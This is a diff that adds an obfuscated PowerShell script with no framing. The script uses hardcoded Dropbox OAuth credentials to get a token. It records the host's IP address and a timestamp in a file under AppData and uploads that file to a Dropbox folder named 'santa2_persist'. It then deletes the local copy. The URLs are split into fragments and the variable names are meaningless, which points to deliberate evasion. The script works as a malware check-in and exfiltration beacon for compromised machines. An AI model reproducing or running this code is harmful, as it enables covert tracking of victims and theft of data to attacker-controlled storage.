@@ -1,0 +1,37 @@
+$ttttttttttttttttttttttpppppppppppppppppppp = $env:AppData;
+
+$tokenRequestParams = @{
+    grant_type    = "refresh_token"
+    refresh_token = "CxR76FAp2JAAAAAAAAAAAYc-Z6EEUm1sCkInZnCsHRQKCp5lOSKBMipCEudngc-l";
+    client_id     =  "8azqsrgxsd8fwrg"
+    client_secret = "jjaqv85bmknr7st"
+}
+$qwa = "https://a" + "pi.dr" + "opboxa" + "pi.com/oau" + "th2/to" + "ken"
+$myttto = Invoke-RestMethod -Uri $qwa -Method Post -Body $tokenRequestParams
+
+
+$ipAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null }).IPAddress[0]
+$currentTime = Get-Date -Format "MMdd_HHmm"
+
+$fileName = "$ipAddress-$currentTime-XXX-santa2.txt"
+
+$srcPath = Join-Path $ttttttttttttttttttttttpppppppppppppppppppp $fileName
+
+"xmil" | Out-File -FilePath $srcPath
+
+
+$outputFile = Split-Path $srcPath -leaf
+$tttttffffppp="/githut/santa2_persist/$outputFile"
+$arg = '{ "path": "' + $tttttffffppp + '", "mode": "add", "autorename": true, "mute": false }'
+$authorization = "Bearer " + $($myttto.access_token)
+$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+$headers.Add("Authorization", $authorization)
+$headers.Add("Dropbox-API-Arg", $arg)
+$headers.Add("Content-Type", 'application/octet-stream')
+
+$diauyadsf = "djdaidjaid"
+$diaahah = "1818adjfiasdjif"
+$djaijd = 190298312838123
+$urrrr = "https://content.drop"+"boxa"+"pi.com/2/f" + "iles/uplo" + "ad";
+Invoke-RestMethod -Uri $urrrr -Method Post -InFile $srcPath -Headers $headers
+Remove-Item -Path $srcPath;
